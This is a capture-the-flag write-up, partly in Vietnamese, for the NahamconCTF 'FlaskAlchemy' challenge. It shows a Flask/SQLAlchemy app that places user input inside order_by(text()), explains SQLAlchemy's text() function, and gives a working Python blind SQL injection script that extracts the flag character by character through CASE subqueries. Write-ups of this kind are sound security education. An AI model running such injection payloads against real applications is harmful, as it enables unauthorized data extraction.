# NahamconCTF - FlaskAlchemy

```python
# .....
        else:
            metals = Metal.query.filter(
                Metal.name.like("%{}%".format(search))
            ).order_by(text(order))
        return render_template("home.html", metals=metals)
# .....
```

```
function sqlalchemy.sql.expression.text(text, bind=None)
```
Construct a new TextClause clause, *representing a textual SQL string* directly(thay vi call tung object).

Hàm `text()` nhận chuỗi query sql text truyền thống thay vì gọi từng object như Alchemy chuẩn. Syntax dạng Oracle

Tham khảo: https://docs.sqlalchemy.org/en/14/core/sqlelement.html
E.g.:
```python
from sqlalchemy import text

t = text("SELECT * FROM users")
result = connection.execute(t)
```


**python script**:
```python
import requests
import string

url = 'http://challenge.nahamcon.com:32714/'
characters = '_' + string.ascii_lowercase + string.digits + '}'

flag = 'flag{'
for i in range(30):
    for c in characters:
        data = {
            'search': '',
            'order': f'(SELECT CASE WHEN (select SUBSTR(flag,{len(flag)+1},1) from flag limit 1)="{c}" THEN "name" ELSE "atomic_number" END)'
        }

        r = requests.post(url, data=data)
        print('[-] - trying: ' + c)
        if '89' in r.text[2575:2544+137]:
            flag += c
            print('[+] - found: ' + flag)
            break

# name: Atomic Number: 89
# atomic_number: 3
```

**flag**:  `flag{order_by_blind}`
